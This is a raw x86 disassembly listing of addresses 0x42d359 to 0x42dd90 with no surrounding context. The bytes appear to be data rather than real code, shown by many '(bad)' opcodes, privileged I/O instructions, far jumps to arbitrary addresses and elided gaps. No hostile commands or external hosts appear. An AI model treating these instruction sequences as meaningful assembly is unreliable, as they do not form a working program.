  42d359:	adc    DWORD PTR [ebx+0x48],edi
  42d35c:	mov    cl,0xcc
  42d35e:	and    DWORD PTR [edi-0x69cb7c35],eax
  42d364:	push   0x17bec892
  42d369:	retf   0xd636
  42d36c:	shl    DWORD PTR [ecx],1
  42d36e:	pop    ds
  42d36f:	pop    ecx
  42d370:	into   
  42d371:	and    esp,DWORD PTR [esi-0x9]
  42d374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d375:	adc    al,0x6f
  42d377:	adc    dh,dl
  42d379:	sbb    eax,0xaad9ee14
  42d37e:	loopne 0x42d36a
  42d380:	mov    eax,0xf18222d1
  42d385:	jns    0x42d324
  42d387:	push   esi
  42d388:	cmp    ch,BYTE PTR [esi+0x3c]
  42d38b:	jecxz  0x42d3b6
  42d38d:	and    dh,ch
  42d38f:	stos   BYTE PTR es:[edi],al
  42d390:	and    al,0xa5
  42d392:	xor    eax,0xf51d713d
  42d397:	mov    cl,0x70
  42d399:	xchg   BYTE PTR [esp+ecx*1],dh
  42d39c:	xor    bh,cl
  42d39e:	and    DWORD PTR [edx-0x5def7f2b],esi
  42d3a4:	int3   
  42d3a5:	repnz test DWORD PTR [edi+0x71],esp
  42d3a9:	arpl   WORD PTR [edi-0x3e],bp
  42d3ac:	xchg   ebp,eax
  42d3ad:	iret   
  42d3ae:	(bad)  
  42d3af:	push   ebx
  42d3b0:	ffreep st(4)
  42d3b2:	mov    al,0xb6
  42d3b4:	jns    0x42d40f
  42d3b6:	rcr    DWORD PTR [ebx+0x70],1
  42d3b9:	adc    al,0x73
  42d3bb:	test   eax,0x8699951
  42d3c0:	test   DWORD PTR [edx+0x0],ebp
	...
  42d433:	add    ah,ch
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xc5e80781
  42d442:	popa   
  42d443:	cld    
  42d444:	fild   WORD PTR fs:[ecx]
  42d447:	add    dh,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    BYTE PTR ds:0xb37bd92a,bl
  42d451:	aas    
  42d452:	inc    esp
  42d453:	and    edi,DWORD PTR [eax-0x1e144729]
  42d459:	push   es
  42d45a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d45b:	mov    dl,0xd0
  42d45d:	in     eax,0x2
  42d45f:	or     DWORD PTR [ebp+ecx*8+0x5d],esp
  42d463:	ins    DWORD PTR es:[edi],dx
  42d464:	test   eax,0xbd1af8df
  42d469:	iret   
  42d46a:	cmp    DWORD PTR [ecx+eiz*8-0x55e4ebfc],ecx
  42d471:	xchg   edi,eax
  42d472:	fcomp  QWORD PTR [esi]
  42d474:	dec    esp
  42d475:	mov    bl,0x42
  42d477:	pushw  ds
  42d479:	lock ret 
  42d47b:	std    
  42d47c:	popf   
  42d47d:	ror    DWORD PTR [ebx+0x5e81428],1
  42d483:	mov    dh,0xf2
  42d485:	ja     0x42d4d9
  42d487:	call   0x2e611022
  42d48c:	loop   0x42d444
  42d48e:	aaa    
  42d48f:	stos   BYTE PTR es:[edi],al
  42d490:	cld    
  42d491:	pop    ebp
  42d492:	xor    ch,ah
  42d494:	out    dx,al
  42d495:	hlt    
  42d496:	xchg   BYTE PTR [edx],bh
  42d498:	in     eax,dx
  42d499:	cdq    
  42d49a:	scas   al,BYTE PTR es:[edi]
  42d49b:	pusha  
  42d49c:	jne    0x42d44b
  42d49e:	mov    esi,0xd8a2b900
  42d4a3:	dec    esi
  42d4a4:	or     al,al
  42d4a6:	mov    ebp,0x6beb322f
  42d4ab:	in     al,0xa
  42d4ad:	repz mov eax,ds:0x18fcd058
  42d4b3:	in     eax,dx
  42d4b4:	popa   
  42d4b5:	lock outs dx,BYTE PTR ds:[esi]
  42d4b7:	and    ah,ch
  42d4b9:	or     dl,bh
  42d4bb:	out    dx,al
  42d4bc:	adc    esi,DWORD PTR [ebx+0x4d]
  42d4bf:	test   al,0xf0
  42d4c1:	xchg   ebp,eax
  42d4c2:	sub    DWORD PTR [ebx+0x32],eax
  42d4c5:	xor    ebx,DWORD PTR [ebx+0x6e]
  42d4c8:	call   0x99ed:0x4ac7c946
  42d4cf:	cmp    BYTE PTR [ecx],0x52
  42d4d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4d3:	mov    dh,0x4
  42d4d5:	dec    ebx
  42d4d6:	(bad)
  42d4da:	mov    ds:0xdf761090,al
  42d4df:	sub    al,0xb7
  42d4e1:	jne    0x42d472
  42d4e3:	frstor [ebx]
  42d4e5:	js     0x42d542
  42d4e7:	stc    
  42d4e8:	ins    BYTE PTR es:[edi],dx
  42d4e9:	mov    bl,BYTE PTR [ebp-0x23f10c52]
  42d4ef:	and    bh,al
  42d4f1:	adc    cl,BYTE PTR [edi]
  42d4f3:	mov    dh,0x94
  42d4f5:	xchg   edx,eax
  42d4f6:	push   0x998b3586
  42d4fb:	inc    ebp
  42d4fc:	inc    ebp
  42d4fd:	imul   ebx,DWORD PTR [ebx+0x5b],0xffffffbd
  42d501:	mov    eax,0xfbfcd81e
  42d506:	idiv   ecx
  42d508:	add    BYTE PTR [edi],cl
  42d50a:	ja     0x42d48e
  42d50c:	jno    0x42d4fd
  42d50e:	xor    DWORD PTR [edx],ebp
  42d510:	or     BYTE PTR [ecx+0x17],ah
  42d513:	loopne 0x42d4bb
  42d515:	xchg   edi,eax
  42d516:	sbb    esi,eax
  42d518:	add    ebp,DWORD PTR [edx]
  42d51a:	je     0x42d57b
  42d51c:	push   0x47
  42d51e:	fs xor eax,0x479c3004
  42d524:	push   ecx
  42d525:	outs   dx,BYTE PTR ds:[esi]
  42d526:	cld    
  42d527:	mov    BYTE PTR [eax],al
  42d529:	rcl    DWORD PTR [esi],1
  42d52b:	bound  esp,QWORD PTR [ebx+0x9]
  42d52e:	mov    DWORD PTR [ecx+edi*2],eax
  42d531:	rcr    DWORD PTR [ebp+edx*4+0x62cc515f],0x18
  42d539:	repnz retf 0xccae
  42d53d:	sahf   
  42d53e:	push   ebx
  42d53f:	loope  0x42d4c3
  42d541:	fiadd  WORD PTR [eax]
	...
  42d5b3:	add    BYTE PTR [ebp+0x48],bl
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	sub    eax,DWORD PTR [edx*4+0x1e05ab1]
  42d5c7:	add    dh,dh
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    al,cl
  42d5cd:	sub    eax,DWORD PTR [ecx+0x23]
  42d5d0:	push   esi
  42d5d1:	sbb    DWORD PTR [ebp+edx*8-0x3e66144e],eax
  42d5d8:	pop    ds
  42d5d9:	fs mov esi,0xde167385
  42d5df:	ret    0xb30e
  42d5e2:	retf   0x852
  42d5e5:	mov    dl,0xb8
  42d5e7:	fistp  DWORD PTR [edi+0x2c89906d]
  42d5ed:	mov    BYTE PTR [ecx-0x25],bl
  42d5f0:	repz aad 0x7d
  42d5f3:	nop
  42d5f4:	test   al,0x64
  42d5f6:	ins    DWORD PTR es:[edi],dx
  42d5f7:	xchg   ebx,eax
  42d5f8:	mov    edx,0x8dc0a66a
  42d5fd:	out    0x7d,eax
  42d5ff:	js     0x42d63c
  42d601:	popa   
  42d602:	xor    edx,DWORD PTR [esi-0x36c5aca3]
  42d608:	xor    BYTE PTR [edi],bl
  42d60a:	repz push cs
  42d60c:	stos   BYTE PTR es:[edi],al
  42d60d:	rcr    DWORD PTR [esi-0x19238f8b],cl
  42d613:	push   ds
  42d614:	sti    
  42d615:	mov    al,0xcb
  42d617:	pop    ebx
  42d618:	sub    eax,0xe8f1c584
  42d61d:	mov    bh,0xe5
  42d61f:	mov    WORD PTR [ebx-0x80],ds
  42d622:	cmp    al,0xf8
  42d624:	and    BYTE PTR [edx-0x2f91dd40],0x6a
  42d62b:	in     al,dx
  42d62c:	push   cs
  42d62d:	shr    esi,1
  42d62f:	push   ecx
  42d630:	or     cl,BYTE PTR [eax-0x7e]
  42d633:	cwde   
  42d634:	mov    ch,0x59
  42d636:	pop    es
  42d637:	div    edx
  42d639:	into   
  42d63a:	xchg   ebp,eax
  42d63b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d63c:	rol    BYTE PTR [ebx-0x1f5fe79],1
  42d642:	sub    BYTE PTR [ebx+0x24],ch
  42d645:	sbb    eax,0x491b91dc
  42d64a:	hlt    
  42d64b:	mov    edi,0x7fccd4ca
  42d650:	pop    ebx
  42d651:	out    0xaf,al
  42d653:	inc    edx
  42d654:	xchg   ebp,eax
  42d655:	jg     0x42d637
  42d657:	sar    DWORD PTR ds:0xf66a71e,1
  42d65d:	ins    DWORD PTR es:[edi],dx
  42d65e:	mov    eax,ds:0xfa60b160
  42d663:	mov    dl,0xd5
  42d665:	je     0x42d684
  42d667:	jl     0x42d667
  42d669:	(bad)  
  42d66b:	ret    0xd754
  42d66e:	ret    0x2368
  42d671:	stos   DWORD PTR es:[edi],eax
  42d672:	push   0x26
  42d674:	leave  
  42d675:	push   ebx
  42d676:	pop    ebx
  42d677:	inc    ecx
  42d678:	push   edx
  42d679:	ret    0xc614
  42d67c:	xor    ecx,DWORD PTR [edi+edx*8]
  42d67f:	repnz cdq 
  42d681:	imul   bh
  42d683:	clc    
  42d684:	mov    ebx,0xa6a60a64
  42d689:	ins    BYTE PTR es:[edi],dx
  42d68a:	jno    0x42d6fa
  42d68c:	or     al,0x42
  42d68e:	jmp    0x42d6a7
  42d690:	ror    DWORD PTR [ebx+eax*1],cl
  42d693:	mov    fs,WORD PTR [ebp-0x615bbf9d]
  42d699:	jns    0x42d638
  42d69b:	fs dec esp
  42d69d:	in     eax,dx
  42d69e:	lods   eax,DWORD PTR cs:[esi]
  42d6a0:	rol    BYTE PTR [edx-0x7a],0xe8
  42d6a4:	mov    ebx,0x7c4b1c81
  42d6a9:	pop    esi
  42d6aa:	das    
  42d6ab:	jb     0x42d6d2
  42d6ad:	pop    edx
  42d6ae:	test   cl,bh
  42d6b0:	jns    0x42d676
  42d6b2:	dec    eax
  42d6b3:	iret   
  42d6b4:	adc    eax,0x43af4d52
  42d6b9:	xchg   edx,eax
  42d6ba:	dec    ecx
  42d6bb:	(bad)  
  42d6bc:	sub    dh,ah
  42d6be:	push   0xc4324f
	...
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	addr16 ss js 0x42d7a4
  42d744:	push   eax
  42d745:	loope  0x42d748
  42d747:	add    dh,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    BYTE PTR [edx+0x79efe8be],ch
  42d751:	loopne 0x42d7d1
  42d753:	pop    ebx
  42d754:	in     eax,dx
  42d755:	mov    ecx,edx
  42d757:	adc    eax,0xed3919d7
  42d75c:	addr16 dec esp
  42d75e:	pop    ebx
  42d75f:	fs std 
  42d761:	sbb    bh,al
  42d763:	sbb    dl,BYTE PTR [ebp+0x47]
  42d766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d767:	push   0x2cd79684
  42d76c:	shl    BYTE PTR [edi-0x635a702b],1
  42d772:	pop    es
  42d773:	pop    ebp
  42d774:	push   ebp
  42d775:	cmp    al,0x9a
  42d777:	ds xchg ebx,eax
  42d779:	scas   eax,DWORD PTR es:[edi]
  42d77a:	mov    eax,0xfd45056
  42d77f:	push   ecx
  42d780:	aas    
  42d781:	cwde   
  42d782:	add    DWORD PTR [ecx-0xa],edx
  42d785:	int    0xa9
  42d787:	xor    edx,DWORD PTR [ebp+0x69f6410a]
  42d78d:	test   ebx,edi
  42d78f:	nop
  42d790:	xor    bl,BYTE PTR [edi]
  42d792:	xor    BYTE PTR [ebx-0x2e65efb9],cl
  42d798:	cmp    ecx,DWORD PTR [ecx-0x680f766a]
  42d79e:	or     esi,DWORD PTR [edi+ebp*1]
  42d7a1:	outs   dx,BYTE PTR ds:[esi]
  42d7a2:	mov    ebp,0x6ce340f
  42d7a7:	sub    dl,cl
  42d7a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7aa:	mov    DWORD PTR [ebp+0x6e],0x8ab717a2
  42d7b1:	inc    eax
  42d7b2:	lock fpatan 
  42d7b5:	sbb    eax,ebp
  42d7b7:	(bad)  
  42d7b8:	xor    ecx,DWORD PTR ds:0x9d8fa11
  42d7be:	cmp    eax,0xe8f8cb85
  42d7c3:	dec    ebp
  42d7c4:	outs   dx,BYTE PTR ds:[esi]
  42d7c5:	int    0xd2
  42d7c7:	ret    
  42d7c8:	sub    DWORD PTR [ebp+0x45],ebp
  42d7cb:	call   0x2f5e:0x6ee1301a
  42d7d2:	(bad)  
  42d7d3:	outs   dx,BYTE PTR ss:[esi]
  42d7d5:	jecxz  0x42d7e5
  42d7d7:	loop   0x42d786
  42d7d9:	adc    al,0x3
  42d7db:	dec    eax
  42d7dc:	push   eax
  42d7dd:	push   0x55f6826f
  42d7e2:	mov    esi,edi
  42d7e4:	cmp    DWORD PTR [ecx-0x2e812dc4],esp
  42d7ea:	sbb    BYTE PTR [edx-0x17df9c1a],0x1f
  42d7f1:	stc    
  42d7f2:	sahf   
  42d7f3:	outs   dx,BYTE PTR ds:[esi]
  42d7f4:	or     dh,BYTE PTR [eax-0x7f206745]
  42d7fa:	(bad)  
  42d7fb:	xchg   esi,eax
  42d7fc:	inc    edx
  42d7fd:	fcomp  st(2)
  42d7ff:	stos   DWORD PTR es:[edi],eax
  42d800:	sub    edx,esp
  42d802:	je     0x42d7eb
  42d804:	lock pop esp
  42d806:	imul   esp,DWORD PTR [edi],0xffffffd7
  42d809:	pop    edx
  42d80a:	(bad)  
  42d80b:	sub    BYTE PTR [ecx+0x886adb3],bl
  42d811:	add    BYTE PTR [ecx-0x4ca4cc62],al
  42d817:	xor    al,0x5e
  42d819:	push   ebx
  42d81a:	jbe    0x42d885
  42d81c:	mov    dl,0x15
  42d81e:	rcl    al,cl
  42d820:	jl     0x42d851
  42d822:	clc    
  42d823:	loop   0x42d83c
  42d825:	dec    ebp
  42d826:	cmp    al,0xa1
  42d828:	mov    ds:0x54ef09fc,al
  42d82d:	add    al,0x56
  42d82f:	adc    edi,0x27
  42d832:	xor    al,0x3b
  42d834:	ss nop
  42d836:	xor    BYTE PTR [eax+0x6c],bl
  42d839:	pop    esp
  42d83a:	ds jae 0x42d856
  42d83d:	popa   
  42d83e:	pop    es
  42d83f:	(bad)  [ebx]
  42d841:	lock add BYTE PTR [eax],al
	...
  42d8b4:	adc    BYTE PTR [ebx],bl
  42d8b6:	leave  
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x89dcc254
  42d8c1:	ja     0x42d8b3
  42d8c3:	add    eax,DWORD PTR [esi-0x1e]
  42d8c6:	add    DWORD PTR [eax],eax
  42d8c8:	test   BYTE PTR [eax],0x0
  42d8cb:	add    BYTE PTR [ecx-0x56],bh
  42d8ce:	cmp    eax,0xcea15459
  42d8d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8d4:	mov    eax,0x9e84e82d
  42d8d9:	mov    al,0x30
  42d8db:	push   cs
  42d8dc:	fcmovbe st,st(3)
  42d8de:	cwde   
  42d8df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d8e0:	jge    0x42d8d1
  42d8e2:	loopne 0x42d920
  42d8e4:	pop    es
  42d8e5:	shl    BYTE PTR [edx-0x1f3bba43],1
  42d8eb:	stos   BYTE PTR es:[edi],al
  42d8ec:	(bad)  
  42d8ee:	jae    0x42d890
  42d8f0:	sub    DWORD PTR [ecx],esp
  42d8f2:	imul   ecx,DWORD PTR [edi+0x3165d8b5],0xae552fda
  42d8fc:	fwait
  42d8fd:	repz (bad) 
  42d8ff:	(bad)  
  42d900:	mov    ah,0x57
  42d902:	daa    
  42d903:	mov    al,ds:0xd31f7917
  42d908:	fild   QWORD PTR ds:0x2653d98a
  42d90e:	xor    BYTE PTR [ebx-0x374b11fc],ch
  42d914:	xor    al,0xf1
  42d916:	jno    0x42d8cc
  42d918:	sub    eax,0x55c34edf
  42d91d:	push   DWORD PTR [esi-0x7]
  42d920:	rol    BYTE PTR [ebp+esi*1-0x19],0x6e
  42d925:	cmp    dh,BYTE PTR [edi]
  42d927:	jp     0x42d992
  42d929:	test   esp,edx
  42d92b:	call   0x80331216
  42d930:	call   FWORD PTR [eax+0x5a]
  42d933:	xchg   esp,eax
  42d934:	xchg   edi,eax
  42d935:	outs   dx,DWORD PTR ds:[esi]
  42d936:	cmp    DWORD PTR [ebp+ecx*8-0x4b],ebx
  42d93a:	jns    0x42d96b
  42d93c:	mov    edx,0xe34e8baa
  42d941:	xlat   BYTE PTR ds:[ebx]
  42d942:	xor    DWORD PTR [eax+0x78],ebx
  42d945:	mov    bh,0xbf
  42d947:	icebp  
  42d948:	arpl   WORD PTR [esi+0x3c],bp
  42d94b:	lds    ecx,FWORD PTR [eax+0x38]
  42d94e:	mov    ds:0x8de4e64d,eax
  42d953:	call   0x554d:0x22ba573a
  42d95a:	and    esp,DWORD PTR [ebx+0x71b1080]
  42d960:	dec    edx
  42d961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d962:	loop   0x42d9c6
  42d964:	shl    BYTE PTR [ecx],0x56
  42d967:	mul    DWORD PTR [esi+ebp*2-0x1dd26148]
  42d96e:	mov    al,0x3d
  42d970:	jno    0x42d9eb
  42d972:	mov    ebx,0x2ee394e2
  42d977:	ror    DWORD PTR [edx-0x421c5bdc],cl
  42d97d:	xchg   eax,ecx
  42d97f:	mov    ch,0xf0
  42d981:	jmp    0x885b8e7c
  42d986:	daa    
  42d987:	out    dx,al
  42d988:	cli    
  42d989:	jne    0x42d973
  42d98b:	inc    ebp
  42d98c:	dec    ebp
  42d98d:	pop    DWORD PTR [edi]
  42d98f:	pop    ebp
  42d990:	sbb    al,0x9a
  42d992:	sbb    DWORD PTR [eax],edx
  42d994:	pop    edx
  42d995:	mov    ebx,0x5f71776a
  42d99a:	xor    bl,BYTE PTR [ebp+0x49]
  42d99d:	cs xchg esp,eax
  42d99f:	bound  ecx,QWORD PTR [eax-0x28]
  42d9a2:	xor    al,0x4f
  42d9a4:	jmp    0x4f830148
  42d9a9:	cld    
  42d9aa:	stos   BYTE PTR es:[edi],al
  42d9ab:	cmc    
  42d9ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9ad:	fcom   DWORD PTR ds:0xe339dbdc
  42d9b3:	cmc    
  42d9b4:	pop    edi
  42d9b5:	dec    ebx
  42d9b6:	ins    BYTE PTR es:[edi],dx
  42d9b7:	fcomp  DWORD PTR [esi-0x591f93b6]
  42d9bd:	xor    ebx,ebp
  42d9bf:	push   ebp
  42d9c0:	mov    bl,0xa8
	...
  42da32:	add    BYTE PTR [eax],al
  42da34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da35:	fimul  DWORD PTR [eax-0x10ac02bf]
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	(bad)  
  42da42:	cmp    DWORD PTR [ebx],eax
  42da44:	cmp    al,0xe3
  42da46:	add    DWORD PTR [eax],eax
  42da48:	test   BYTE PTR [eax],0x0
  42da4b:	add    BYTE PTR [ebp-0x71],dh
  42da4e:	jmp    0x52a7fb79
  42da53:	and    DWORD PTR [eax-0x7c4de838],0xe2b4c888
  42da5d:	or     eax,DWORD PTR [eax+0x63243fe7]
  42da63:	xchg   esp,eax
  42da64:	std    
  42da65:	add    dh,dl
  42da67:	popa   
  42da68:	push   ss
  42da69:	and    al,0x49
  42da6b:	mov    cl,0x2b
  42da6d:	and    dh,BYTE PTR [esi-0x6a2c11b3]
  42da73:	aad    0x75
  42da75:	ret    
  42da76:	cld    
  42da77:	mov    edx,0xfc0fad00
  42da7c:	rol    DWORD PTR [esi],1
  42da7e:	int    0x7c
  42da80:	cli    
  42da81:	mov    eax,ds:0x4b519aa
  42da86:	aad    0x51
  42da88:	mov    DWORD PTR ds:0x581a3d04,eax
  42da8e:	add    DWORD PTR [ebx+0x77],edi
  42da91:	ds dec ecx
  42da93:	aaa    
  42da94:	pop    edx
  42da95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da96:	stos   DWORD PTR es:[edi],eax
  42da97:	xchg   ecx,eax
  42da98:	xor    ch,0x86
  42da9b:	mov    dh,0x55
  42da9d:	sbb    eax,0xc338f237
  42daa2:	lds    esp,FWORD PTR [ecx]
  42daa4:	add    ch,BYTE PTR [ecx+0x34]
  42daa7:	xor    eax,0x3937aa2e
  42daac:	inc    eax
  42daad:	xchg   ebx,eax
  42daae:	jge    0x42dadc
  42dab0:	lods   al,BYTE PTR ds:[esi]
  42dab1:	jmp    0x42da97
  42dab3:	outs   dx,BYTE PTR ds:[esi]
  42dab4:	sub    BYTE PTR [ebx+0x6a],bl
  42dab7:	add    eax,0x6003b816
  42dabc:	sbb    eax,0x2914e277
  42dac1:	rcl    BYTE PTR ds:0x4d9a09d3,0x36
  42dac8:	xchg   edx,eax
  42dac9:	mov    ebx,0xe8e1bb7
  42dace:	(bad)  
  42dacf:	std    
  42dad0:	(bad)  
  42dad1:	out    dx,al
  42dad2:	addr16 dec ecx
  42dad4:	push   edx
  42dad5:	gs out dx,eax
  42dad7:	mov    eax,ds:0x43ed6f46
  42dadc:	shr    DWORD PTR [esi+0x1081791f],cl
  42dae2:	scas   eax,DWORD PTR es:[edi]
  42dae3:	pusha  
  42dae4:	pop    edx
  42dae5:	inc    ecx
  42dae6:	or     bh,BYTE PTR [ebx+edi*8]
  42dae9:	xchg   edx,eax
  42daea:	mov    dl,0x82
  42daec:	add    eax,DWORD PTR [ebx+0x19]
  42daef:	sub    bh,BYTE PTR [ebx]
  42daf1:	mov    DWORD PTR [edx+0xf],0x2076c0b6
  42daf8:	add    DWORD PTR [eax+eax*2+0x49],edi
  42dafc:	mov    dl,0x85
  42dafe:	pop    ds
  42daff:	fcom   QWORD PTR [esp+eax*8+0x1a]
  42db03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db04:	(bad)  
  42db05:	(bad)  
  42db07:	(bad)  
  42db09:	dec    ebp
  42db0a:	cmp    al,0x7a
  42db0c:	or     ah,BYTE PTR [ebx-0x71cf8509]
  42db12:	adc    BYTE PTR [esi+0x381cd5eb],cl
  42db18:	mov    bh,dh
  42db1a:	xchg   DWORD PTR [ebp-0x3a],esi
  42db1d:	adc    eax,0x5bed1fd8
  42db22:	dec    edi
  42db23:	pushf  
  42db24:	ja     0x42db4f
  42db26:	pop    ecx
  42db27:	xchg   edx,eax
  42db28:	inc    esp
  42db29:	push   ebx
  42db2a:	int3   
  42db2b:	outs   dx,DWORD PTR ds:[esi]
  42db2c:	xor    al,0x8c
  42db2e:	push   cs
  42db2f:	mov    ah,0xfb
  42db31:	push   edi
  42db32:	and    eax,0xa3bc49dd
  42db37:	mov    bh,0xd8
  42db39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db3a:	push   esi
  42db3b:	pop    eax
  42db3c:	jecxz  0x42daeb
  42db3e:	ficom  DWORD PTR [ecx]
  42db40:	xchg   edi,eax
  42db41:	xchg   DWORD PTR [eax],eax
	...
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0xc0e5337,al
  42dbc3:	popa   
  42dbc4:	xor    ah,ah
  42dbc6:	add    DWORD PTR [eax],eax
  42dbc8:	test   BYTE PTR [eax],0x0
  42dbcb:	add    BYTE PTR [eax+0x3c0e9494],bh
  42dbd1:	pop    esp
  42dbd2:	push   ds
  42dbd3:	sbb    BYTE PTR [ebx],bh
  42dbd5:	imul   edx,DWORD PTR [esi-0x48],0x148cd6b7
  42dbdc:	push   ecx
  42dbdd:	sub    DWORD PTR [ecx],0x4e
  42dbe0:	or     ebp,0x16f25861
  42dbe6:	xchg   edx,eax
  42dbe7:	fwait
  42dbe8:	sbb    dl,BYTE PTR [ecx-0x5d0b8dbf]
  42dbee:	push   es
  42dbef:	inc    edx
  42dbf0:	add    ebp,esp
  42dbf2:	and    eax,0x35ef236a
  42dbf7:	jne    0x42dc50
  42dbf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dbfa:	add    esp,0x60
  42dbfd:	dec    esi
  42dbfe:	jne    0x42dc13
  42dc00:	push   ss
  42dc01:	xor    al,0x72
  42dc03:	popf   
  42dc04:	(bad)  
  42dc05:	cmp    BYTE PTR [ecx+0x6aa1a7f],dl
  42dc0b:	pop    edi
  42dc0c:	outs   dx,DWORD PTR ds:[esi]
  42dc0d:	(bad)  
  42dc0e:	sbb    WORD PTR [edx-0x35],sp
  42dc12:	xchg   ebx,eax
  42dc13:	sub    BYTE PTR [esi-0x7c91a018],0x56
  42dc1a:	rcl    eax,0x86
  42dc1d:	out    dx,al
  42dc1e:	inc    edx
  42dc1f:	bound  edx,QWORD PTR [edi-0x25]
  42dc22:	cdq    
  42dc23:	(bad)  
  42dc24:	dec    ebp
  42dc25:	inc    ebp
  42dc26:	add    DWORD PTR [esi+0x4a],edx
  42dc29:	push   ss
  42dc2a:	les    edi,FWORD PTR [esi-0x5e]
  42dc2d:	mov    ds:0x79898fe1,eax
  42dc32:	scas   al,BYTE PTR es:[edi]
  42dc33:	mov    al,ds:0x1a47fe30
  42dc38:	lahf   
  42dc39:	aaa    
  42dc3a:	mov    edi,0xa88eb1a2
  42dc3f:	jg     0x42dbeb
  42dc41:	in     al,dx
  42dc42:	pop    ebp
  42dc43:	mov    dh,0x73
  42dc45:	mov    dh,0xd2
  42dc47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc48:	mov    esp,0x6432b22a
  42dc4d:	push   edx
  42dc4e:	sti    
  42dc4f:	mov    esi,0x57ea2e40
  42dc54:	rcr    DWORD PTR [ecx+edx*2+0x46],1
  42dc58:	jne    0x42dbdd
  42dc5a:	ins    DWORD PTR es:[edi],dx
  42dc5b:	inc    edi
  42dc5c:	cmp    BYTE PTR [esi-0x6f],0x73
  42dc60:	jb     0x42dc08
  42dc62:	mov    cl,0xa1
  42dc64:	push   ds
  42dc65:	stc    
  42dc66:	test   BYTE PTR [edi+0x19],0xa6
  42dc6a:	outs   dx,BYTE PTR ds:[esi]
  42dc6b:	dec    edi
  42dc6c:	imul   BYTE PTR [ebx]
  42dc6e:	xchg   edi,eax
  42dc6f:	fidivr DWORD PTR [edi-0x6bafdc5a]
  42dc75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc76:	ds pop edx
  42dc78:	mov    bh,0x69
  42dc7a:	mov    dl,0xc2
  42dc7c:	or     eax,0xf4874422
  42dc81:	into   
  42dc82:	sub    BYTE PTR [ecx+0x2e],bh
  42dc85:	std    
  42dc86:	mov    al,0x7e
  42dc88:	dec    eax
  42dc89:	mov    ch,0x15
  42dc8b:	gs dec ebp
  42dc8d:	idiv   DWORD PTR [eax+eax*8]
  42dc90:	ret    0xea8d
  42dc93:	pop    edi
  42dc94:	mov    ah,0x77
  42dc96:	xchg   ebx,eax
  42dc97:	mov    dl,0x46
  42dc99:	icebp  
  42dc9a:	adc    ah,al
  42dc9c:	inc    edx
  42dc9d:	push   ss
  42dc9e:	xor    BYTE PTR [ebx+0x77],ah
  42dca1:	push   ss
  42dca2:	stos   DWORD PTR es:[edi],eax
  42dca3:	aad    0xc3
  42dca5:	jb     0x42dc8b
  42dca7:	cdq    
  42dca8:	ret    0x9586
  42dcab:	neg    DWORD PTR [edx]
  42dcad:	(bad)  
  42dcae:	mov    edi,0x418768ec
  42dcb3:	into   
  42dcb4:	int    0xba
  42dcb6:	call   0x4f5728d9
  42dcbb:	mov    esp,0x3bbee585
  42dcc0:	adc    eax,0x1b
	...
  42dd31:	add    BYTE PTR [eax],al
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx+0x432f3156]
  42dd44:	sub    ch,ah
  42dd46:	add    DWORD PTR [eax],eax
  42dd48:	test   BYTE PTR [eax],0x0
  42dd4b:	add    BYTE PTR [ebx+0x60],dl
  42dd4e:	xor    ebx,DWORD PTR [eax-0x9ef6ec4]
  42dd54:	retf   0x67a8
  42dd57:	cmp    BYTE PTR [ecx],0x27
  42dd5a:	in     al,0x54
  42dd5c:	addr16 pop es
  42dd5e:	aad    0x6f
  42dd60:	jno    0x42dd07
  42dd62:	les    esi,FWORD PTR [eax-0x66486ea3]
  42dd68:	cld    
  42dd69:	mov    al,ds:0x1ad83194
  42dd6e:	cmp    DWORD PTR [esp+eax*4+0x4bb0b117],edx
  42dd75:	cmp    al,dh
  42dd77:	inc    ebp
  42dd78:	addr16 jb 0x42dd26
  42dd7b:	repnz shl DWORD PTR [esi],cl
  42dd7e:	add    ecx,DWORD PTR [esi-0x2e]
  42dd81:	mov    bh,dh
  42dd83:	in     al,0xe5
  42dd85:	inc    edx
  42dd86:	loope  0x42dddd
  42dd88:	xor    al,0x89
  42dd8a:	sahf   
  42dd8b:	fistp  QWORD PTR [edx]
  42dd8d:	mov    bl,0x28
  42dd8f:	push   eax
  42dd90:	push   0xffffff91
